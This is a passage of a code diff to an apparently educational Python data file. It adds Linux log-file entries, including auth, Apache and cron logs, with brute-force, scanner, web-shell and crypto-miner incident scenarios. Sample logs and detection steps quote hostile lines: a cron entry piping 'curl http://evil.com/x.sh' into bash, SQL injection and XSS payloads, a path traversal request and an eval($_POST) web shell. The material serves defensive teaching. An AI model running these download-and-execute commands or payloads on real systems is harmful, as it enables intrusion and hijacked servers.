@@ -11,8 +11,8 @@ DEVICES = {
         "layers": [7, 6, 5, 4, 3, 2, 1],
         "icon": "🚪",
         "color": "#e74c3c",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Adsl_router.jpg/640px-Adsl_router.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/gateways.gif",
+
         "short": "Connects two different networks using different protocols.",
         "use_case": "Your home Wi-Fi router acts as a gateway between your home network and your ISP's network. It translates between your private IP (192.168.x.x) and the public internet.",
         "how_it_works": [
@@ -33,8 +33,7 @@ DEVICES = {
         "layers": [7],
         "icon": "🛡️",
         "color": "#e74c3c",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Fortigate_100D.jpg/640px-Fortigate_100D.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/waf.gif",
         "short": "Inspects application-layer traffic to block attacks.",
         "use_case": "Protects websites from SQL injection, XSS, and DDoS attacks by analyzing HTTP/HTTPS requests before they reach the web server.",
         "how_it_works": [
@@ -55,8 +54,7 @@ DEVICES = {
         "layers": [7],
         "icon": "🔀",
         "color": "#e74c3c",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/Server-rack.jpg/640px-Server-rack.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/proxy.png",
         "short": "Acts as intermediary between client and server.",
         "use_case": "Corporate proxies filter employee web access and cache frequently visited sites to save bandwidth.",
         "how_it_works": [
@@ -79,8 +77,7 @@ DEVICES = {
         "layers": [4, 3],
         "icon": "🔥",
         "color": "#27ae60",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Firewall.png/640px-Firewall.png",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/statefulfirewall.gif",
         "short": "Tracks connection state and filters by port/protocol.",
         "use_case": "Blocks incoming connections to port 22 (SSH) from the internet while allowing outgoing connections.",
         "how_it_works": [
@@ -103,8 +100,8 @@ DEVICES = {
         "layers": [3],
         "icon": "🌐",
         "color": "#3498db",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/b/b1/Cisco_1841_Router.jpg/640px-Cisco_1841_Router.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/ciscorouter.avif",
+
         "short": "Routes packets between different networks using IP addresses.",
         "use_case": "Your home router connects your local network to the internet. It decides where each packet should go based on its IP address.",
         "how_it_works": [
@@ -125,8 +122,8 @@ DEVICES = {
         "layers": [3, 2],
         "icon": "⚙️",
         "color": "#3498db",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Cisco_Catalyst_2960_switch.jpg/640px-Cisco_Catalyst_2960_switch.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/layer3switch.jpg",
+
         "short": "Combines routing and switching in hardware.",
         "use_case": "Enterprise networks use L3 switches to route between VLANs at wire speed.",
         "how_it_works": [
@@ -149,8 +146,8 @@ DEVICES = {
         "layers": [2],
         "icon": "🔗",
         "color": "#9b59b6",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4a/24-port_switch.jpg/640px-24-port_switch.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/networkswitch.gif",
+
         "short": "Forwards frames to specific devices using MAC addresses.",
         "use_case": "Office switches connect 24-48 computers and forward data only to the intended device, not broadcasting to all like a hub.",
         "how_it_works": [
@@ -171,8 +168,8 @@ DEVICES = {
         "layers": [2],
         "icon": "🌉",
         "color": "#9b59b6",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Ethernet_bridge.jpg/640px-Ethernet_bridge.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/bridge.jpeg",
+
         "short": "Connects two network segments at the data link layer.",
         "use_case": "Bridges connect wired and wireless segments, or split large networks to reduce collisions.",
         "how_it_works": [
@@ -193,8 +190,8 @@ DEVICES = {
         "layers": [2, 1],
         "icon": "💳",
         "color": "#9b59b6",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9c/Network_card.jpg/640px-Network_card.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/niccard.jpeg",
+
         "short": "Hardware that connects a computer to a network.",
         "use_case": "Every computer has a NIC — wired (Ethernet) or wireless (Wi-Fi). It has a unique MAC address burned in.",
         "how_it_works": [
@@ -215,8 +212,8 @@ DEVICES = {
         "layers": [2, 1],
         "icon": "📡",
         "color": "#9b59b6",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Wireless_access_point.jpg/640px-Wireless_access_point.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/AP.gif",
+
         "short": "Provides wireless network access to devices.",
         "use_case": "Office APs let laptops and phones connect to the wired network over Wi-Fi.",
         "how_it_works": [
@@ -237,8 +234,8 @@ DEVICES = {
         "layers": [2, 1],
         "icon": "📞",
         "color": "#9b59b6",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2e/Cable_modem.jpg/640px-Cable_modem.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/modem.gif",
+
         "short": "Converts digital data to signals for transmission media.",
         "use_case": "Cable/DSL modems convert your home network's digital data to signals that travel over phone/cable lines.",
         "how_it_works": [
@@ -261,8 +258,8 @@ DEVICES = {
         "layers": [1],
         "icon": "🔌",
         "color": "#1abc9c",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3d/4_port_netgear_ethernet_hub.jpg/640px-4_port_netgear_ethernet_hub.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/hub.jpeg",
+
         "short": "Broadcasts data to all connected devices (legacy).",
         "use_case": "Old hubs are rarely used now — they broadcast every packet to every device, causing collisions and wasted bandwidth.",
         "how_it_works": [
@@ -283,8 +280,8 @@ DEVICES = {
         "layers": [1],
         "icon": "🔁",
         "color": "#1abc9c",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Wi-Fi_repeater.jpg/640px-Wi-Fi_repeater.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/repeater.jpg",
+
         "short": "Regenerates weak signals to extend network range.",
         "use_case": "Extends Wi-Fi or Ethernet beyond normal distance limits by regenerating the signal.",
         "how_it_works": [
@@ -305,8 +302,8 @@ DEVICES = {
         "layers": [1],
         "icon": "🧵",
         "color": "#1abc9c",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Cat5e_cable.jpg/640px-Cat5e_cable.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/cables.jpeg",
+
         "short": "Physical medium that carries data signals.",
         "use_case": "Cat6 Ethernet cables carry data at 1-10 Gbps over 100 meters using twisted copper pairs.",
         "how_it_works": [
@@ -327,8 +324,8 @@ DEVICES = {
         "layers": [1],
         "icon": "📶",
         "color": "#1abc9c",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3f/SFP_transceiver.jpg/640px-SFP_transceiver.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/transceiver.jpeg",
+
         "short": "Converts between electrical and optical signals.",
         "use_case": "SFP+ transceivers in switches convert electrical signals to fiber optic light for long-distance links.",
         "how_it_works": [
@@ -349,8 +346,8 @@ DEVICES = {
         "layers": [1],
         "icon": "📡",
         "color": "#1abc9c",
-        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Cell_tower.jpg/640px-Cell_tower.jpg",
-        "image_credit": "Wikimedia Commons",
+        "image": "/static/images/antenna.jpeg",
+
         "short": "Converts electrical signals to radio waves.",
         "use_case": "Wi-Fi antennas broadcast and receive radio waves so laptops and phones can connect wirelessly.",
         "how_it_works": [
@@ -7039,6 +7036,2219 @@ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
     }
 ]
 
+# ==================== LINUX: LOG FILES ====================
+LINUX_LOG_FILES = [
+    {
+        "name": "auth.log / secure",
+        "path": "/var/log/auth.log",
+        "alt_path": "/var/log/secure (RHEL/CentOS)",
+        "icon": "🔐",
+        "color": "#e74c3c",
+        "purpose": "Records ALL authentication events — SSH logins, sudo usage, su switches, PAM activity.",
+        "critical": True,
+        "read_command": "sudo tail -f /var/log/auth.log",
+        "search_command": "sudo grep 'Failed password' /var/log/auth.log",
+        "what_logged": [
+            "SSH login attempts (success + failure)",
+            "sudo command execution",
+            "su user switches",
+            "PAM authentication",
+            "Cron session openings",
+            "User creation/deletion",
+            "Password changes"
+        ],
+        "sample_output": """Jan 15 14:23:45 server sshd[1234]: Failed password for invalid user admin from 203.0.113.5 port 51234 ssh2
+Jan 15 14:23:47 server sshd[1234]: Failed password for invalid user admin from 203.0.113.5 port 51236 ssh2
+Jan 15 14:23:49 server sshd[1234]: Failed password for invalid user admin from 203.0.113.5 port 51238 ssh2
+Jan 15 14:23:52 server sshd[1234]: Connection closed by authenticating user root 203.0.113.5 port 51240 [preauth]
+Jan 15 14:24:01 server sshd[1235]: Accepted password for alice from 192.168.1.50 port 45678 ssh2
+Jan 15 14:24:01 server sshd[1235]: pam_unix(sshd:session): session opened for user alice by (uid=0)
+Jan 15 14:24:15 server sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow""",
+        "real_world_scenario": {
+            "title": "SSH Brute Force Attack in Progress",
+            "story": "At 2:23 AM, an attacker in Russia starts hammering your SSH port with the username 'admin' and thousands of common passwords. Within 90 seconds, your auth.log has 40+ entries. Here's what you'd see and do.",
+            "trigger": "You open a terminal to check 'why is the server so slow?' and run a quick grep.",
+            "steps": [
+                {"step": 1, "title": "You notice something odd", "cmd": "sudo grep 'Failed password' /var/log/auth.log | tail -20", "explain": "You see a wall of failed logins from the same IP — a telltale sign of brute force.", "color": "#f39c12"},
+                {"step": 2, "title": "Count the volume", "cmd": "sudo grep 'Failed password' /var/log/auth.log | wc -l", "explain": "The count is 847 in the last hour. Normal is 0-2. This is an attack.", "color": "#e74c3c"},
+                {"step": 3, "title": "Identify the attacker", "cmd": "sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -5", "explain": "Ranks attacking IPs by attempt count. Top hit: 203.0.113.5 with 642 attempts.", "color": "#9b59b6"},
+                {"step": 4, "title": "Check if they succeeded", "cmd": "sudo grep 'Accepted' /var/log/auth.log | grep '203.0.113.5'", "explain": "Empty output = no successful login. Good. The attack failed but is ongoing.", "color": "#27ae60"},
+                {"step": 5, "title": "Block immediately", "cmd": "sudo ufw deny from 203.0.113.5", "explain": "Instant block. Any new packet from this IP is silently dropped at the firewall.", "color": "#3498db"},
+                {"step": 6, "title": "Verify the block", "cmd": "sudo ufw status | grep 203.0.113.5", "explain": "Confirms rule is active. Attack is over (from this IP at least).", "color": "#27ae60"}
+            ]
+        },
+        "detection_commands": [
+            {"cmd": "sudo grep 'Failed password' /var/log/auth.log | wc -l", "desc": "Total failed login attempts", "output": "847"},
+            {"cmd": "sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head", "desc": "Top 10 attacking IPs", "output": """  642 203.0.113.5
+   58 198.51.100.42
+   23 192.0.2.77
+   12 45.33.22.11"""},
+            {"cmd": "sudo grep 'Accepted' /var/log/auth.log", "desc": "All successful logins", "output": """Jan 15 09:12:01 server sshd[1111]: Accepted password for alice from 192.168.1.50 port 45678 ssh2
+Jan 15 14:24:01 server sshd[1235]: Accepted password for alice from 192.168.1.50 port 45680 ssh2"""},
+            {"cmd": "sudo lastb | head -20", "desc": "Recent bad login attempts (btmp)", "output": """admin    ssh:notty    203.0.113.5      Mon Jan 15 14:23 - 14:23  (00:00)
+root     ssh:notty    203.0.113.5      Mon Jan 15 14:22 - 14:22  (00:00)
+test     ssh:notty    198.51.100.42    Mon Jan 15 14:15 - 14:15  (00:00)"""},
+            {"cmd": "sudo last | head -20", "desc": "Recent successful logins (wtmp)", "output": """alice    pts/0        192.168.1.50     Mon Jan 15 14:24   still logged in
+alice    pts/0        192.168.1.50     Mon Jan 15 09:12 - 12:34  (03:22)"""}
+        ],
+        "response_actions": [
+            "Block IP: sudo ufw deny from 203.0.113.5",
+            "Enable fail2ban: sudo apt install fail2ban && sudo systemctl enable --now fail2ban",
+            "Disable SSH password auth: edit /etc/ssh/sshd_config → PasswordAuthentication no",
+            "Use SSH keys only — much more secure",
+            "Change SSH port to non-standard (2222) to reduce automated noise",
+            "Consider restricting SSH to VPN only"
+        ],
+        "simulation": [
+            {"step": 1, "title": "Attacker starts scanning", "desc": "Botnet hits port 22 from 203.0.113.5", "from": "Attacker", "to": "Server:22", "data": "Trying 'admin'", "color": "#e74c3c"},
+            {"step": 2, "title": "First failed login", "desc": "sshd logs the failure", "from": "sshd", "to": "auth.log", "data": "Failed password", "color": "#f39c12"},
+            {"step": 3, "title": "Attack ramps up", "desc": "847 attempts in 60 minutes", "from": "Attacker", "to": "sshd", "data": "More attempts", "color": "#c0392b"},
+            {"step": 4, "title": "You spot it", "desc": "grep 'Failed password' | wc -l → 847", "from": "Admin", "to": "auth.log", "data": "Attack detected", "color": "#3498db"},
+            {"step": 5, "title": "Block IP", "desc": "sudo ufw deny from 203.0.113.5", "from": "Admin", "to": "Firewall", "data": "Rule added", "color": "#27ae60"},
+            {"step": 6, "title": "Attack stops", "desc": "Attacker now sees timeout", "from": "Firewall", "to": "Attacker", "data": "DROP (silent)", "color": "#27ae60"}
+        ]
+    },
+    {
+        "name": "Apache access log",
+        "path": "/var/log/apache2/access.log",
+        "alt_path": "/var/log/httpd/access_log (RHEL)",
+        "icon": "🌐",
+        "color": "#27ae60",
+        "purpose": "Every HTTP request to your web server — IP, method, URL, status, user agent.",
+        "critical": True,
+        "read_command": "sudo tail -f /var/log/apache2/access.log",
+        "search_command": "grep 'sqlmap' /var/log/apache2/access.log",
+        "what_logged": [
+            "Client IP + port",
+            "HTTP method + URL",
+            "Response status code",
+            "Response size",
+            "User-Agent",
+            "Referer"
+        ],
+        "sample_output": """192.168.1.50 - - [15/Jan/2024:14:23:45 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0)"
+203.0.113.5 - - [15/Jan/2024:14:23:47 +0000] "GET /admin.php HTTP/1.1" 404 512 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:48 +0000] "GET /../../etc/passwd HTTP/1.1" 400 226 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:49 +0000] "GET /wp-login.php HTTP/1.1" 200 4532 "-" "Mozilla/5.0"
+203.0.113.5 - - [15/Jan/2024:14:23:50 +0000] "POST /login.php HTTP/1.1" 200 512 "https://target.com/login" "Mozilla/5.0\"""",
+        "real_world_scenario": {
+            "title": "Automated Vulnerability Scanner Hits Your Website",
+            "story": "At 2:23 PM, someone launches sqlmap against your web server to hunt for SQL injection. Within seconds, your access log fills with hundreds of requests — /admin, /wp-login, /../../etc/passwd, and payloads trying to break your database.",
+            "trigger": "You notice unusual traffic on your Grafana dashboard, or a user reports the site is slow.",
+            "steps": [
+                {"step": 1, "title": "Spot the traffic spike", "cmd": "tail -f /var/log/apache2/access.log", "explain": "You see hundreds of requests per second — all from one IP. Normal traffic wouldn't look like this.", "color": "#f39c12"},
+                {"step": 2, "title": "Identify the attacker's user agent", "cmd": "grep 'sqlmap' /var/log/apache2/access.log | head", "explain": "The User-Agent is literally 'sqlmap/1.7.2'. Most scanners don't bother hiding. This is a huge red flag.", "color": "#e74c3c"},
+                {"step": 3, "title": "See what they're probing", "cmd": "awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head", "explain": "Top URLs: /admin.php, /wp-login.php, /.env, /backup.sql. They're hunting for common exposed files.", "color": "#9b59b6"},
+                {"step": 4, "title": "Check if any SQLi worked", "cmd": "grep -i 'union.*select' /var/log/apache2/access.log", "explain": "If you see requests with ' OR 1=1' or 'UNION SELECT', sqlmap is actively testing your parameters.", "color": "#e74c3c"},
+                {"step": 5, "title": "Check if they succeeded", "cmd": "grep ' 200 ' /var/log/apache2/access.log | grep sqlmap", "explain": "200 responses with scanning User-Agent = attack partially succeeded. Investigate further!", "color": "#c0392b"},
+                {"step": 6, "title": "Block & deploy WAF", "cmd": "sudo ufw deny from 203.0.113.5", "explain": "Block IP. Then enable ModSecurity or move to Cloudflare to prevent future scans.", "color": "#27ae60"}
+            ]
+        },
+        "detection_commands": [
+            {"cmd": "awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head", "desc": "Top 10 visitor IPs", "output": """  4521 192.168.1.50
+   842 203.0.113.5
+    23 198.51.100.42
+    12 172.16.5.100"""},
+            {"cmd": "grep 'sqlmap\\|nikto\\|nmap' /var/log/apache2/access.log", "desc": "Find scanner tools", "output": """203.0.113.5 - - [15/Jan/2024:14:23:47] "GET /admin.php" 404 512 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:48] "GET /../../etc/passwd" 400 226 "-" "sqlmap/1.7.2"
+203.0.113.5 - - [15/Jan/2024:14:23:49] "GET /wp-login.php" 200 4532 "-" "sqlmap/1.7.2\""""},
+            {"cmd": "grep ' 404 ' /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head", "desc": "IPs hitting 404s (directory brute force)", "output": """  487 203.0.113.5
+    8 198.51.100.42"""},
+            {"cmd": "grep -i 'union.*select' /var/log/apache2/access.log", "desc": "SQLi attempts", "output": """203.0.113.5 - - [15/Jan/2024:14:23:52] "GET /product.php?id=1' UNION SELECT 1,user(),3-- -" 500 1234 "-" "sqlmap/1.7.2\""""},
+            {"cmd": "grep -i '<script>' /var/log/apache2/access.log", "desc": "XSS attempts", "output": """203.0.113.5 - - [15/Jan/2024:14:24:01] "GET /search?q=<script>alert(1)</script>" 200 512 "-" "sqlmap/1.7.2\""""}
+        ],
+        "response_actions": [
+            "Block scanner IP: sudo ufw deny from 203.0.113.5",
+            "Enable ModSecurity (WAF) — blocks payloads at the HTTP layer",
+            "Add rate limiting to Nginx/Apache (limit_req_zone)",
+            "Put Cloudflare in front — free tier blocks most scans",
+            "Review any 200 responses with scanner User-Agents (attacks that worked!)",
+            "Move admin panels behind VPN or IP allowlist"
+        ],
+        "simulation": [
+            {"step": 1, "title": "Scanner starts", "desc": "sqlmap sends first probe", "from": "Attacker", "to": "Web Server", "data": "GET /admin.php", "color": "#e74c3c"},
+            {"step": 2, "title": "Access log records", "desc": "Every request appended", "from": "Apache", "to": "access.log", "data": "404 /admin.php", "color": "#f39c12"},
+            {"step": 3, "title": "Hundreds of probes", "desc": "Common paths, injections", "from": "Attacker", "to": "Web Server", "data": "GET /../../etc/passwd", "color": "#c0392b"},
+            {"step": 4, "title": "You spot it", "desc": "grep sqlmap access.log", "from": "Admin", "to": "access.log", "data": "Scanner identified", "color": "#3498db"},
+            {"step": 5, "title": "Block + WAF", "desc": "UFW deny + enable ModSecurity", "from": "Admin", "to": "Firewall+WAF", "data": "Attack stopped", "color": "#27ae60"},
+            {"step": 6, "title": "Verify no breach", "desc": "grep 200 responses with scanner UA", "from": "Admin", "to": "access.log", "data": "No successful SQLi", "color": "#27ae60"}
+        ]
+    },
+    {
+        "name": "Apache error log",
+        "path": "/var/log/apache2/error.log",
+        "alt_path": "/var/log/httpd/error_log (RHEL)",
+        "icon": "⚠️",
+        "color": "#e67e22",
+        "purpose": "PHP errors, permission denials, crashes, and module warnings.",
+        "critical": True,
+        "read_command": "sudo tail -f /var/log/apache2/error.log",
+        "search_command": "grep -i 'permission denied' /var/log/apache2/error.log",
+        "what_logged": [
+            "PHP fatal errors and warnings",
+            "File permission denials",
+            "Module load errors",
+            "SSL/TLS handshake failures",
+            "CGI script errors"
+        ],
+        "sample_output": """[Mon Jan 15 14:23:45 2024] [php:warn] [pid 1234] [client 192.168.1.50:54321] PHP Warning: Undefined variable $user in /var/www/html/login.php on line 15
+[Mon Jan 15 14:23:47 2024] [authz_core:error] [pid 1235] [client 203.0.113.5:51234] AH01630: client denied by server configuration: /var/www/html/admin
+[Mon Jan 15 14:23:48 2024] [core:error] [pid 1236] [client 203.0.113.5:51236] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/config
+[Mon Jan 15 14:24:01 2024] [ssl:error] [pid 1237] SSL Library Error: error:14094416:SSL routines:ssl3_read_bytes:sslv3 alert certificate unknown""",
+        "real_world_scenario": {
+            "title": "Web Shell Upload Attempt Detected",
+            "story": "An attacker exploits a file upload vulnerability on your site, uploading shell.php. They then try to trigger it and crash PHP. Your error.log shows permission denials and PHP errors that reveal the attack.",
+            "trigger": "You get an alert that error.log has jumped to 10,000 lines in 5 minutes.",
+            "steps": [
+                {"step": 1, "title": "Check what's flooding the log", "cmd": "sudo tail -50 /var/log/apache2/error.log", "explain": "You see repeated 'client denied' from one IP — someone hammering blocked paths.", "color": "#f39c12"},
+                {"step": 2, "title": "Look for PHP crashes", "cmd": "grep 'PHP Fatal' /var/log/apache2/error.log | tail -20", "explain": "Repeated 'shell_exec()' warnings reveal a web shell trying to run OS commands.", "color": "#e74c3c"},
+                {"step": 3, "title": "Find uploaded web shell", "cmd": "find /var/www -name '*.php' -newermt '1 hour ago'", "explain": "Locates shell.php uploaded in the last hour. This is the attacker's backdoor.", "color": "#c0392b"},
+                {"step": 4, "title": "Verify it's malicious", "cmd": "cat /var/www/html/uploads/shell.php | head -20", "explain": "See eval($_POST['cmd']) — classic web shell. Nobody legit uploads this.", "color": "#e74c3c"},
+                {"step": 5, "title": "Delete the shell", "cmd": "sudo rm /var/www/html/uploads/shell.php", "explain": "Remove the backdoor immediately. Then check for OTHER uploaded files.", "color": "#27ae60"},
+                {"step": 6, "title": "Lock down uploads", "cmd": "sudo chmod 755 /var/www/html/uploads && chown www-data:www-data", "explain": "Prevents upload of executable PHP. Config: disable PHP execution in /uploads.", "color": "#3498db"}
+            ]
+        },
+        "detection_commands": [
+            {"cmd": "grep -i 'error\\|warn' /var/log/apache2/error.log | tail -50", "desc": "Recent errors", "output": """[Mon Jan 15 14:23:45] [php:warn] PHP Warning: Undefined variable $user in login.php:15
+[Mon Jan 15 14:23:47] [authz_core:error] client denied by server configuration: /admin
+[Mon Jan 15 14:23:48] [core:error] Symbolic link not allowed: /config"""},
+            {"cmd": "grep 'client denied' /var/log/apache2/error.log", "desc": "Access denials (potential reconnaissance)", "output": """[Mon Jan 15 14:23:47] [client 203.0.113.5:51234] AH01630: client denied by server configuration: /admin
+[Mon Jan 15 14:23:49] [client 203.0.113.5:51236] AH01630: client denied by server configuration: /wp-admin"""},
+            {"cmd": "grep 'PHP Fatal' /var/log/apache2/error.log", "desc": "App crashes (potential exploitation)", "output": """[Mon Jan 15 14:24:01] [php:error] PHP Fatal error: Uncaught Error: Call to undefined function shell_exec() in /uploads/shell.php:3"""},
+            {"cmd": "grep 'shell_exec\\|system\\|exec\\|passthru' /var/log/apache2/error.log", "desc": "Command execution attempts", "output": """[Mon Jan 15 14:24:03] PHP Warning: shell_exec(): Cannot execute blank command in /uploads/shell.php:5"""}
+        ],
+        "response_actions": [
+            "Delete web shell: sudo rm /var/www/html/uploads/*.php",
+            "Kill child processes: sudo pkill -u www-data",
+            "Check for reverse shells: sudo ss -tulpn | grep www-data",
+            "Disable PHP in upload folder (.htaccess or nginx location rule)",
+            "Patch the file upload vulnerability",
+            "Run file integrity check: aide --check"
+        ],
+        "simulation": [
+            {"step": 1, "title": "Attacker uploads shell", "desc": "Malicious PHP uploaded via vulnerable form", "from": "Attacker", "to": "Uploads Folder", "data": "shell.php uploaded", "color": "#e74c3c"},
+            {"step": 2, "title": "Shell triggered", "desc": "POST /uploads/shell.php?cmd=id", "from": "Attacker", "to": "Web Server", "data": "Trigger web shell", "color": "#f39c12"},
+            {"step": 3, "title": "PHP error logged", "desc": "Command execution attempt visible", "from": "PHP", "to": "error.log", "data": "shell_exec warning", "color": "#c0392b"},
+            {"step": 4, "title": "You spot flood", "desc": "10,000 lines in 5 minutes", "from": "Admin", "to": "error.log", "data": "Anomaly detected", "color": "#3498db"},
+            {"step": 5, "title": "Find + delete shell", "desc": "Locate and remove backdoor", "from": "Admin", "to": "Filesystem", "data": "shell.php deleted", "color": "#27ae60"},
+            {"step": 6, "title": "Patch uploads", "desc": "Block PHP execution in /uploads", "from": "Admin", "to": "Apache Config", "data": "Locked down", "color": "#27ae60"}
+        ]
+    },
+    {
+        "name": "Cron log",
+        "path": "/var/log/syslog (cron entries)",
+        "alt_path": "/var/log/cron (RHEL)",
+        "icon": "⏰",
+        "color": "#9b59b6",
+        "purpose": "Records every scheduled job execution — user, time, command.",
+        "critical": False,
+        "read_command": "grep CRON /var/log/syslog",
+        "search_command": "grep 'alice' /var/log/syslog | grep CRON",
+        "what_logged": [
+            "Scheduled job start/completion",
+            "User who owns the job",
+            "Full command executed",
+            "Errors from the job"
+        ],
+        "sample_output": """Jan 15 14:25:01 server CRON[1234]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
+Jan 15 14:30:01 server CRON[1235]: (alice) CMD (/home/alice/backup.sh)
+Jan 15 14:30:15 server CRON[1235]: (alice) CMD (/home/alice/backup.sh)
+Jan 15 14:35:01 server CRON[1236]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)""",
+        "real_world_scenario": {
+            "title": "Crypto Miner Installed via Malicious Cron Job",
+            "story": "An attacker who got a foothold via a web app creates a cron job that downloads and runs a crypto miner every 5 minutes. It silently consumes your CPU and bandwidth for weeks until you spot it in the logs.",
+            "trigger": "Your server bill went up $400 last month and CPU is pegged at 100% even at 3 AM.",
+            "steps": [
+                {"step": 1, "title": "Something's using all CPU", "cmd": "top", "explain": "You see 'kworker' or 'ld-linux-x86-64' process at 400% CPU. Suspicious name.", "color": "#f39c12"},
+                {"step": 2, "title": "Check cron executions", "cmd": "grep CRON /var/log/syslog | tail -20", "explain": "You see: (www-data) CMD (cd /tmp && curl -s http://evil.com/x.sh | bash)", "color": "#e74c3c"},
+                {"step": 3, "title": "Find the cron file", "cmd": "sudo find /etc/cron* /var/spool/cron -type f -exec grep -l 'evil.com' {} \\;", "explain": "Locates the malicious cron entry — likely in /var/spool/cron/crontabs/www-data.", "color": "#c0392b"},
+                {"step": 4, "title": "See what it downloads", "cmd": "cat /tmp/x.sh 2>/dev/null | head -20", "explain": "The script downloads a Monero miner binary and runs it with --donate-level 1.", "color": "#e74c3c"},
+                {"step": 5, "title": "Remove cron + kill miner", "cmd": "sudo crontab -r -u www-data && sudo pkill -u www-data", "explain": "Deletes the malicious cron and kills the miner process instantly.", "color": "#27ae60"},
+                {"step": 6, "title": "Find initial access", "cmd": "sudo grep 'www-data' /var/log/apache2/access.log | grep -i 'upload\\|shell'", "explain": "Traces how the attacker got in — usually a web shell or RCE exploit.", "color": "#3498db"}
+            ]
+        },
+        "detection_commands": [
+            {"cmd": "grep CRON /var/log/syslog | tail -30", "desc": "Recent cron executions", "output": """Jan 15 14:25:01 server CRON[1234]: (root) CMD (cd / && run-parts /etc/cron.daily)
+Jan 15 14:30:01 server CRON[1235]: (www-data) CMD (cd /tmp && curl -s http://evil.com/x.sh | bash)
+Jan 15 14:35:01 server CRON[1236]: (www-data) CMD (cd /tmp && curl -s http://evil.com/x.sh | bash)"""},
+            {"cmd": "cat /etc/crontab /etc/cron.*/* 2>/dev/null | grep -v '^#'", "desc": "List all scheduled jobs", "output": """*/5 * * * * www-data cd /tmp && curl -s http://evil.com/x.sh | bash"""},
+            {"cmd": "sudo crontab -l -u www-data", "desc": "Check user's crontab", "output": """*/5 * * * * cd /tmp && curl -s http://evil.com/x.sh | bash"""},
+            {"cmd": "grep -i 'curl\\|wget\\|base64' /var/log/syslog | grep CRON", "desc": "Suspicious download jobs", "output": """Jan 15 14:30:01 CRON[1235]: (www-data) CMD (curl -s http://evil.com/x.sh | bash)
+Jan 15 14:35:01 CRON[1236]: (www-data) CMD (curl -s http://evil.com/x.sh | bash)"""}
+        ],
+        "response_actions": [
+            "Delete malicious cron: sudo crontab -r -u www-data",
+            "Kill running processes: sudo pkill -u www-data",
+            "Delete payloads: sudo rm -rf /tmp/x.sh /tmp/miner",
+            "Trace initial access via auth.log and access.log",
+            "Patch the web app vulnerability",
+            "Consider full rebuild if attacker had root"
+        ],
+        "simulation": [
+            {"step": 1, "title": "Foothold gained", "desc": "Attacker exploits web app RCE", "from": "Attacker", "to": "Web Server", "data": "RCE via upload", "color": "#e74c3c"},
+            {"step": 2, "title": "Install persistence", "desc": "Adds cron job to ~www-data", "from": "Attacker", "to": "crontab", "data": "*/5 * * * * curl...", "color": "#f39c12"},
+            {"step": 3, "title": "Cron fires", "desc": "Every 5 minutes", "from": "cron", "to": "www-data CMD", "data": "Download + run", "color": "#c0392b"},
+            {"step": 4, "title": "CPU spikes", "desc": "Miner runs continuously", "from": "Miner", "to": "CPU", "data": "400% load", "color": "#9b59b6"},
+            {"step": 5, "title": "You investigate", "desc": "grep CRON syslog", "from": "Admin", "to": "syslog", "data": "Malicious job spotted", "color": "#3498db"},
+            {"step": 6, "title": "Cleanup", "desc": "Remove cron + kill + patch", "from": "Admin", "to": "System", "data": "System cleaned", "color": "#27ae60"}
+        ]
+    },
+    {
+        "name": "SSH log (auth.log)",
+        "path": "/var/log/auth.log (SSH entries)",
+        "alt_path": "/var/log/secure (RHEL)",
+        "icon": "🔑",
+        "color": "#c0392b",
+        "purpose": "SSH-specific events — connections, auth, disconnects, key usage.",
+        "critical": True,
+        "read_command": "sudo journalctl -u ssh -f",
+        "search_command": "sudo grep sshd /var/log/auth.log",
+        "what_logged": [
+            "Connection accepted from IP",
+            "Password/publickey authentication",
